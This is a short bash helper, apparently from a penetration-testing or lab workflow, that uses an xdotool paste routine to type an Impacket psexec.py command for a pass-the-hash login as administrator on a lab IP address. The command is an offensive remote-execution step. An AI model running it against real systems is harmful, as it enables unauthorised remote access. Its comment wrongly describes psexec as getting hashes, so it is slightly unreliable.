#!/bin/bash

: '
Impacket: psexec.py get NTLM hashes with user.
'

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh

paste_command "psexec.py administrator@10.129.80.76 -hashes "
